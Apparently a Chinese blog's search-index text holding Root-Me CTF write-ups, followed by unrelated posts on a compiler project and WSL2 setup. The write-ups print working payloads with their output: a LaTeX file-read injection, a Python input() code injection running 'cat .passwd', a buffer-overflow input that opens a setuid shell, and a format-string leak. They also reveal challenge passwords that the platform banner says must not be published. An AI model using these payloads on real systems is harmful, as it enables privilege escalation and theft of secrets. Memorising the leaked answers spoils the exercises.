2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.jrJqLGOTOg/main.pdf .Warning: Permanently added the ECDSA host key for IP address &#39;[2001:bc8:35b0:c166::152]:2222&#39; to the list of known hosts. _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\___ \\ / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |__) || (__| | | | (_| | | | __/ | | | (_| | __/ |_| / __/ \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/_____| |___/ root-me.orgapp-script-ch23@challenge02.root-me.org&#39;s password:main.pdf 100% 14KB 180.9KB/s 00:00发现 Flag 被注释掉了再次打开源文件，增加一行\\usepackage{verbatim}以及将改为 \\verbatim{/challenge/app-script/ch23/.passwd}\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/challenge/app-script/ch23/.passwd}\\end{document}重复之前的步骤，编译下载app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/tmp.mprfMcooq7[+] Compilation ...[+] Output file : /tmp/tmp.g2WiS14pgf/main.pdf妈蛋 LaTeX_1nput_1s_n0t_v3ry_s3kur3参考https://0day.work/hacking-with-latex/https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection 关键代码在此Python - input()[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-script-ch6:app-script-ch6@challenge02Connecting to ssh://app-script-ch6@challenge02:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\___ \\ / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |__) || (__| | | | (_| | | | __/ | | | (_| | __/ |_| / __/ \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/_____| |___/ root-me.org ██▒ ▒██░ ░███░ █ █ ░███▒ ░███░ ▓ ███░ ▓█▓ ▓█░ ▓ ▓███ ██▒ ░▓█▓███ ▓ ██ █▒ ░██ ██ ███ ▒░ ▓░████░██ ▓█░ ██ ▒██ ███ ░▓██ ▒█ ██ ░█░ ░██ ▓█ ░█████████████ █ ██░ █▓ ██ █ ░██ ██ ██ ░ ░██▓ ██ ██ ███ ░██▓░███ ███ ▒█ ▓██▓ ░████ █▓ ░████ ░██ ▒█ ▓█████░ ███ ███▓ ▓███ █████░ ████ ▓█ ░██▓░ ▒████████░ ██ ▓█ ██░▒██████████████████░ ██ ▓█ ███▓██▒ ░██████████░ ██ ▓█ ░████▒ ██ ░██▓ ▒█▓ ▒██░ ▒██░ ██ ▒█ ██▓ █▒ █ █▒ ░█ █░ █▓ █ █████████████████████ ████████████▄ ██ ███ ███ ██ ██ ▄████████▄ ▄████████▄ ██████ ████ ████ ▄████████▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████▀ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████ ██ ███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ▀████████▀ ▀████████▀ ██ ██ █ ██ ▀██████████------------------------------------------------------------------------------------------------ Welcome on challenge02 /-----------------------------‘/tmp and /var/tmp are writeableValidation password is stored in $HOME/.passwdUseful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.------------------------------------------------------------------------------------------------ Challenge informations /----------------------------‘Use the ./setuid-wrapper to get the right privileges.app-script-ch6@challenge02:~$app-script-ch6@challenge02:~$ lltotal 32dr-xr-x--- 2 app-script-ch6-cracked app-script-ch6 4096 May 19 2019 ./drwxr-xr-x 23 root root 4096 Aug 18 21:10 ../-rw-r----- 1 app-script-ch6 app-script-ch6 54 Aug 8 2017 .motd-r-------- 1 app-script-ch6-cracked app-script-ch6-cracked 33 May 20 2014 .passwd-r-xr-x--- 1 app-script-ch6 app-script-ch6 365 Jun 12 2014 ch6.py*-rwsr-x--- 1 app-script-ch6-cracked app-script-ch6 7260 May 19 2019 setuid-wrapper*-r--r----- 1 app-script-ch6-cracked app-script-ch6 207 May 19 2019 setuid-wrapper.c查看 ch6.py 文件#!/usr/bin/python2import sysdef youLose(): print &quot;Try again ;-)&quot; sys.exit(1)try: p = input(&quot;Please enter password : &quot;)except: youLose()with open(&quot;.passwd&quot;) as f: passwd = f.readline().strip() try: if (p == int(passwd)): print &quot;Well done ! You can validate with this password !&quot; except: youLose()再查看 setuid-wrapper.c#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;/* setuid script wrapper */int main(){ setreuid(geteuid(), geteuid()); system(&quot;/challenge/app-script/ch6/ch6.py&quot;); return 0;}app-script-ch6@challenge02:~$ ./setuid-wrapperPlease enter password : __import__(&#39;os&#39;).system(&#39;cat .passwd&#39;)13373439872909134298363103573901https://blog.51cto.com/u_12332766/2299894https://www.cnblogs.com/heycomputer/articles/10537633.htmlBash - Shells restreints提示语 RTFMÉnoncéRécupérez le mot de passe de validation dans le fichier .passwd.Votre objectif est d’escalader les utilisateurs un par un à l’aide des commandes disponibles, pour arriver jusqu’à app-script-ch14-14 qui aura les droits de lecture sur le fichier .passwd.官方索引：Escaping Restricted Linux Shells - Escaping Restricted Linux ShellsShells restreints comment les détourner - Dawid Gołuński[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-script-ch14:app-script-ch14@challenge02Connecting to ssh://app-script-ch14@challenge02:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\___ \\ / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |__) || (__| | | | (_| | | | __/ | | | (_| | __/ |_| / __/ \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/_____| |___/ root-me.org ██▒ ▒██░ ░███░ █ █ ░███▒ ░███░ ▓ ███░ ▓█▓ ▓█░ ▓ ▓███ ██▒ ░▓█▓███ ▓ ██ █▒ ░██ ██ ███ ▒░ ▓░████░██ ▓█░ ██ ▒██ ███ ░▓██ ▒█ ██ ░█░ ░██ ▓█ ░█████████████ █ ██░ █▓ ██ █ ░██ ██ ██ ░ ░██▓ ██ ██ ███ ░██▓░███ ███ ▒█ ▓██▓ ░████ █▓ ░████ ░██ ▒█ ▓█████░ ███ ███▓ ▓███ █████░ ████ ▓█ ░██▓░ ▒████████░ ██ ▓█ ██░▒██████████████████░ ██ ▓█ ███▓██▒ ░██████████░ ██ ▓█ ░████▒ ██ ░██▓ ▒█▓ ▒██░ ▒██░ ██ ▒█ ██▓ █▒ █ █▒ ░█ █░ █▓ █ █████████████████████ ████████████▄ ██ ███ ███ ██ ██ ▄████████▄ ▄████████▄ ██████ ████ ████ ▄████████▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████▀ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████ ██ ███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ▀████████▀ ▀████████▀ ██ ██ █ ██ ▀██████████------------------------------------------------------------------------------------------------ Welcome on challenge02 /-----------------------------‘/tmp and /var/tmp are writeableValidation password is stored in $HOME/.passwdUseful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit. ====================== || Restricted shell || ================================ || ||&amp;lt;(.)&amp;gt;||&amp;lt;(.)&amp;gt;|| || || _|| || ||_ || || (__D || C__) || || (__D || C__) || || (__D || C__) || || (__D || C__) || || || || || || ================================ * Don&#39;t forget to check &#39;sudo -l&#39; for all steps. * No output network access authorized. * Keep your commands on hand ;)app-script-ch14@challenge02:~$参考：https://habr.com/ru/post/321760/Web - ServeurHTML - Code sourcechrome 直接 F12 查看源代码&amp;lt;!-- Je crois que c&#39;est vraiment trop simple là ! It&#39;s really too easy ! password : nZ^&amp;amp;@q5&amp;amp;sjJHev0--&amp;gt;HTTP - User-agent查看源码使用 chrome 自带工具修改 user-agenthttps://exp-blog.com/safe/ctf/rootme/web-server/http-user-agent/user-agent 修改教程 https://dysaniazzz.github.io/2019/06/06/useragent/HTTP - POST提示语：Connaissez-vous le protocole HTTP ?官方参考：https://en.wikipedia.org/wiki/POST_(HTTP)查看源码，修改，提交https://exp-blog.com/safe/ctf/rootme/web-server/http-post/右键 -&amp;gt; Edit as HTMLApp - Systèmehttp://showlinkroom.me/2017/11/20/Root-me-App-System01/ELF x86 - Stack buffer overflow basic 1[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-systeme-ch13:app-systeme-ch13@challenge02Connecting to ssh://app-systeme-ch13@challenge02:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\___ \\ / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |__) || (__| | | | (_| | | | __/ | | | (_| | __/ |_| / __/ \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/_____| |___/ root-me.org ██▒ ▒██░ ░███░ █ █ ░███▒ ░███░ ▓ ███░ ▓█▓ ▓█░ ▓ ▓███ ██▒ ░▓█▓███ ▓ ██ █▒ ░██ ██ ███ ▒░ ▓░████░██ ▓█░ ██ ▒██ ███ ░▓██ ▒█ ██ ░█░ ░██ ▓█ ░█████████████ █ ██░ █▓ ██ █ ░██ ██ ██ ░ ░██▓ ██ ██ ███ ░██▓░███ ███ ▒█ ▓██▓ ░████ █▓ ░████ ░██ ▒█ ▓█████░ ███ ███▓ ▓███ █████░ ████ ▓█ ░██▓░ ▒████████░ ██ ▓█ ██░▒██████████████████░ ██ ▓█ ███▓██▒ ░██████████░ ██ ▓█ ░████▒ ██ ░██▓ ▒█▓ ▒██░ ▒██░ ██ ▒█ ██▓ █▒ █ █▒ ░█ █░ █▓ █ █████████████████████ ████████████▄ ██ ███ ███ ██ ██ ▄████████▄ ▄████████▄ ██████ ████ ████ ▄████████▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████▀ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████ ██ ███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ▀████████▀ ▀████████▀ ██ ██ █ ██ ▀██████████------------------------------------------------------------------------------------------------ Welcome on challenge02 /-----------------------------‘/tmp and /var/tmp are writeableValidation password is stored in $HOME/.passwdUseful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.------------------------------------------------------------------------------------------------ Challenge informations /----------------------------‘./ch13: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d2ae5f2bb448364a35f8abfc3d07ce36d5c8f230, not strippedlibc: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 70 Symbols No 0 2 ./ch13ASLR is OFFapp-systeme-ch13@challenge02:~$app-systeme-ch13@challenge02:~$ lltotal 28dr-xr-x--- 2 app-systeme-ch13-cracked app-systeme-ch13 4096 May 19 2019 ./drwxr-xr-x 18 root root 4096 Mar 17 2018 ../-r-------- 1 app-systeme-ch13-cracked app-systeme-ch13 17 Mar 18 2015 .passwd-r--r----- 1 app-systeme-ch13-cracked app-systeme-ch13 537 May 19 2019 Makefile-r-sr-x--- 1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19 2019 ch13*-r--r----- 1 app-systeme-ch13-cracked app-systeme-ch13 555 May 19 2019 ch13.c#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(){ int var; int check = 0x04030201; char buf[40]; fgets(buf,45,stdin); printf(&quot;\\n[buf]: %s\\n&quot;, buf); printf(&quot;[check] %p\\n&quot;, check); if ((check != 0x04030201) &amp;amp;&amp;amp; (check != 0xdeadbeef)) printf (&quot;\\nYou are on the right way!\\n&quot;); if (check == 0xdeadbeef) { printf(&quot;Yeah dude! You win!\\nOpening your shell...\\n&quot;); setreuid(geteuid(), geteuid()); system(&quot;/bin/bash&quot;); printf(&quot;Shell closed! Bye.\\n&quot;); } return 0;}app-systeme-ch13@challenge02:~$ pythonPython 2.7.17 (default, Feb 27 2021, 15:10:58)[GCC 7.5.0] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt;```python 2.7 print “\\xef\\xbe\\xad\\xde”ﾭÞ``` app-systeme-ch13@challenge02:~$ python -c &#39;print &quot;a&quot;*40+&quot;\\xef\\xbe\\xad\\xde&quot; + &quot;\\x00&quot;*4052 + &quot;cat .passwd&quot;&#39; | ./ch13[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ[check] 0xdeadbeefYeah dude! You win!Opening your shell...1w4ntm0r3pr0np1sShell closed! Bye.app-systeme-ch13@challenge02:~$ (python -c &#39;print &quot;a&quot;*40+&quot;\\xef\\xbe\\xad\\xde&quot; &#39;; cat ) | ./ch13[buf]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaﾭÞ[check] 0xdeadbeefYeah dude! You win!Opening your shell...cat .passwd1w4ntm0r3pr0np1s^CShell closed! Bye.app-systeme-ch13@challenge02:~$这个方法不对app-systeme-ch13@challenge02:~$ ./ch130000000000000000000000000000000000000000ﾭÞ[buf]: 0000000000000000000000000000000000000000ﾭÃ[check] 0xc3adbeefYou are on the right way!app-systeme-ch13@challenge02:~$cat .passwd原因在于手打的 ﾭÞ 无法被正确转义，app-systeme-ch13@challenge02:~$ 0000000000000000000000000000000000000000ﾭÞWARNING:root:could not open file &#39;/etc/apt/sources.list.d/nodesource.list&#39;0000000000000000000000000000000000000000\\udcef\\udcbe\\udcad\\udcc3\\udc9e: command not foundapp-systeme-ch13@challenge02:~$直接被识别成五个字符了，所以用 python 比较靠谱。ELF x86 - Format string bug basic 1[Press Shift-F1 for help]Host/IP or ssh:// URL [localhost]: ssh://app-systeme-ch5:app-systeme-ch5@challenge02Connecting to ssh://app-systeme-ch5@challenge02:22load pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_rsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_dsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ecdsa_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_ed25519_sk&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directoryload pubkey &quot;/dev/null/.ssh/id_xmss&quot;: Not a directory _ _ _ ___ ____ ___| |__ __ _| | | ___ _ __ __ _ ___ / _ \\___ \\ / __| &#39;_ \\ / _` | | |/ _ \\ &#39;_ \\ / _` |/ _ \\ | | |__) || (__| | | | (_| | | | __/ | | | (_| | __/ |_| / __/ \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|\\___/_____| |___/ root-me.org ██▒ ▒██░ ░███░ █ █ ░███▒ ░███░ ▓ ███░ ▓█▓ ▓█░ ▓ ▓███ ██▒ ░▓█▓███ ▓ ██ █▒ ░██ ██ ███ ▒░ ▓░████░██ ▓█░ ██ ▒██ ███ ░▓██ ▒█ ██ ░█░ ░██ ▓█ ░█████████████ █ ██░ █▓ ██ █ ░██ ██ ██ ░ ░██▓ ██ ██ ███ ░██▓░███ ███ ▒█ ▓██▓ ░████ █▓ ░████ ░██ ▒█ ▓█████░ ███ ███▓ ▓███ █████░ ████ ▓█ ░██▓░ ▒████████░ ██ ▓█ ██░▒██████████████████░ ██ ▓█ ███▓██▒ ░██████████░ ██ ▓█ ░████▒ ██ ░██▓ ▒█▓ ▒██░ ▒██░ ██ ▒█ ██▓ █▒ █ █▒ ░█ █░ █▓ █ █████████████████████ ████████████▄ ██ ███ ███ ██ ██ ▄████████▄ ▄████████▄ ██████ ████ ████ ▄████████▄ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████▀ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████████████ ██ ███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ██ ████ ▀████████▀ ▀████████▀ ██ ██ █ ██ ▀██████████------------------------------------------------------------------------------------------------ Welcome on challenge02 /-----------------------------‘/tmp and /var/tmp are writeableValidation password is stored in $HOME/.passwdUseful commands available: python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, radare2Attention: Publishing solutions publicly (blog, github, youtube, etc.) is forbidden. Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.------------------------------------------------------------------------------------------------ Challenge informations /----------------------------‘./ch5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=bc45458fd23fb2c00bd069a9755569b89d35640a, not strippedlibc: GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH 69 Symbols Yes 0 2 ./ch5ASLR is OFFapp-systeme-ch5@challenge02:~$app-systeme-ch5@challenge02:~$ lltotal 28dr-xr-x--- 2 app-systeme-ch5-cracked app-systeme-ch5 4096 May 19 2019 ./drwxr-xr-x 18 root root 4096 Mar 17 2018 ../-r-------- 1 app-systeme-ch5-cracked app-systeme-ch5 14 Feb 8 2012 .passwd-r--r----- 1 app-systeme-ch5-cracked app-systeme-ch5 507 May 19 2019 Makefile-r-sr-x--- 1 app-systeme-ch5-cracked app-systeme-ch5 7336 May 19 2019 ch5*-r--r----- 1 app-systeme-ch5-cracked app-systeme-ch5 247 May 25 2015 ch5.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;unistd.h&amp;gt; int main(int argc, char *argv[]){ FILE *secret = fopen(&quot;/challenge/app-systeme/ch5/.passwd&quot;, &quot;rt&quot;); char buffer[32]; fgets(buffer, sizeof(buffer), secret); printf(argv[1]); fclose(secret); return 0;}app-systeme-ch5@challenge02:~$ ./ch5 %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x20,804b160,804853d,9,bffffd38,b7e1b589,bffffc14,b7fc3000,b7fc3000,804b160,39617044,28293664,6d617045,bf000a64,804861bapp-systeme-ch5@challenge02:~$app-systeme-ch5@challenge02:~$ ./ch5 $(python -c &#39;print &quot;%08x.&quot;*32&#39;)00000020.0804b160.0804853d.00000009.bffffcc4.b7e1b589.bffffba4.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffba4.bffffbb0.c058f800.bffffb10.00000000.00000000.b7e03f21.b7fc3000.b7fc3000.00000000.b7e03f21.00000002.bffffba4.bffffbb0.bffffb34.00000001.app-systeme-ch5@challenge02:~$大小端转换9apD()6dmapEDpa9d6)(Epamhttp://showlinkroom.me/2017/01/28/pwn-learn-printf/https://blog.csdn.net/qq_29687403/article/details/46953121https://1993-constant.tistory.com/513https://codeby.net/threads/root-me-app-system-elf-x86-format-string-bug-basic-1.67942/https://itszzz.top/2019/04/12/format-string-bug/#the-format-function-family大小端 https://www.jianshu.com/p/a147d486c04cRéseauIP - Time To LiveÉnoncéRetrouvez le TTL employé pour atteindre l’hote ciblé par cet échange de paquets ICMP.开始这个题目会下载一个名为 ch7.pcap 文件，经查为网络数据包，需要专业工具来打开。网上比较推荐 wireshark 这种专业工具，去 Wireshark 官网下载即可，按照步骤安装下来，程序整体比较小。同时安装程序会告诉你 Wireshark 需要 Npcap 来网络流量抓包，询问你是否需要安装， 以及是否需要装 USBPcap 用于 USB 流量抓包。有需要可以选择安装。https://medium.com/blacksecurity/root-me-ip-time-to-live-write-up-492ca954ea6bhttps://ivanitlearning.wordpress.com/2019/02/12/root-me-ip-determine-ttl/TELNET - authentificationÉnoncéRetrouvez le mot de passe de l’utilisateur dans cette capture réseau de session TELNET.这次文件的名字为 ch2.pcap, 同样用 wireshark 打开解析。右键 -&amp;gt; 追踪流 -&amp;gt; TCP 流可以看到内容 Password:user成功https://medium.com/secttp/root-me-network-telnet-authentication-1198f2af3efeProgrammationQuick Response Codehttps://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Programming/%5B09%5D%20%5B40P%5D%20Quick%20Response%20CodeCrackingBash - VM提示语 MaSHine VirtuelleÉnoncéRetrouvez le mot de passe de validation stocké dans cette machine virtuelle Bash.官方参考：Introduction à la Programmation en Bash参考网站https://pipedream.com/requestbinhttps://blog.csdn.net/lyy289065406/article/details/86446176https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Web-Clienthttps://challenge-friang.gitbook.io/challenge-brigitte-friang/" }, { "title": "专业课 - 编译课项目二 - 基于 Jflex 词法分析器和 Cup 句法解析器实现编译器前端", "url": "/posts/MSI-compilation_front_end_of_compiler/", "categories": "Blogging, Study", "tags": "Compilation, Java, Parser", "date": "2021-09-27 20:16:00 +0800", "snippet": "2021年9月30日，周四，今天的编译课程项目：在 Java 环境下基于 Jflex 和 Cup 写一个编译器前端。由于编译器的前端是自行设计的，所以目标编程语言的语法也就是自定义了，为方便这篇 blog 讨论，就记为 Mini Pascal。我们需要编译的目标代码形似汇编语言，因此这个项目的目的就是让我们更加深刻地理解编译器前端的功能。目标语言运行的机器使用 Python 模拟的，整个程序运行过程也是直接可以在环境里完成。理论：Parser Generator另一个参考语言：Scala对于代码的优化更多的集中在汇编代码或者中介代码产生的过程中，而不是在句法层面。例子：2.3 第 13 题的实现。环境搭建运行环境是在 wsl2 的 Ubuntu 20.04 LTS 的基础上搭建的 Java 环境。具体教程参考项目1基于 Jflex 词法分析器和 Cup 句法解析器实现编译器前端编译遇到问题$ make test_mini_pascal.x./asm.py &amp;lt; test_mini_pascal.i &amp;gt; test_mini_pascal.o/usr/bin/env: ‘python3\\r’: Permission deniedmake: *** [Makefile:60: test_mini_pascal.o] Error 126原因是在 windows 环境下创建的文件使用的是 Windows/DOS-style 行尾 （CR+LF），但是 Linux 系统下 Ubuntu 需要的是 Unix-style 行尾 （LF）。因此下载安装一个文件行尾转换器即可$ sudo apt install dos2unix然后转换对应文件$ dos2unix *.pydos2unix: converting file asm.py to Unix format...dos2unix: converting file mach.py to Unix format...dos2unix: converting file to_nasm.py to Unix format...https://askubuntu.com/questions/896860/usr-bin-env-python3-r-no-such-file-or-directory参考链接" }, { "title": "专业课 - 编译课项目一 - 基于 Jflex 词法分析器和 Cup 句法解析器的算术表达式计算器", "url": "/posts/MSI-compilation-calculator-based-on-jflex-cup/", "categories": "Blogging, Study", "tags": "Compilation, Java, Parser", "date": "2021-09-27 20:16:00 +0800", "snippet": "2021年9月27日，周一，今天的编译课程小项目：在 Java 环境下基于 Jflex 和 Cup 编译一个小型计算器。JflexCup环境搭建运行环境是在 wsl2 的 Ubuntu 20.04 LTS 的基础上搭建的 Java 环境。首先更新库sudo apt update然后安装 Java 的 JDK 16sudo apt install openjdk-16-jdk安装完后检查版本java -version输出如下：然后安装 Jflex 和 Cupsudo apt install jflex cup项目：基于 jflex 和 cup 的算术表达式计算器参考链接环境搭建： https://zhuanlan.zhihu.com/p/137114682" }, { "title": "Linux 环境搭建 - 在 Win10 上搭建 wsl2 虚拟 Linux 环境", "url": "/posts/Installation-configuration-wsl2-windows/", "categories": "Blogging, System", "tags": "System, Linux, wsl", "date": "2021-09-27 15:00:00 +0800", "snippet": "WSL2 介绍环境搭建步骤安装 WSL2打开微软官方 WSL2 安装教程，按照官方教程里的安装流程安装即可。注意安装 WSL2 对于 Windows 的版本有一定要求，请事先做好检查。也可以通过安装 Docker 间接安装 WSL2, 在安装过程中 Docker 会要求你下载适用于 Windows 的 Linux 子系统内核，安装后即可。安装 Linux 发行版在微软商店选择一个 Linux 发行版下载就好，比如我选择的是 Ubuntu 20.04 LTS.安装后打开设置用户名密码即可。安装完毕需要进行简单检验一下，打开 Powershell，输入&amp;gt; wsl -l -v看到输出类似如下： NAME STATE VERSION* Ubuntu-20.04 Stopped 2 docker-desktop Stopped 2 docker-desktop-data Stopped 2后面显示 VERSION 2 就对了。安装 Windows Terminal之后在 Windows 商店下载 Windows Terminal。使用比较方便，界面美观，支持一个窗口打开多个 Terminal：命令行、Powershell 和 Linux 都可以一起在一个窗口打开。同时支持自定义，用起来比较舒服，可以通过查看官方的教程来自定义美化自己的 Terminal。安装图形界面安装完 Ubuntu 之后可以安装一个对应的图形界面，方便使用。因为目前暂时没有需求，所以只把找到的参考网站贴在这里：WSL2 + Ubuntu + 图形界面安装Windows10 WSL2 Ubuntu 图形界面环境搭建（Xfce4 、XServer）推荐 Xfce4 和 VcXSrv 的组合。其中 VcXSrv 至今还一直在维护，稳定性有保证。常见问题解决这里列举我在安装过程中遇到的问题以及解决的方案。与 Virtualbox 的兼容问题安装完 WSL2 之后，会发现 Virtualbox 的虚拟机无法启动。在网上查找了资料1之后发现二者并不能完美兼容。在需要使用 Virtualbox 的时候，需要把 hyper-V 的虚拟功能关闭2，但是关闭了该功能后 WSL2 又无法启动了，目前还没有能完美解决该问题的方案3。在 Powershell 中输入如下指令，停用 hyper-V ，使用 Virtualbox&amp;gt; bcdedit /set hypervisorlaunchtype off在 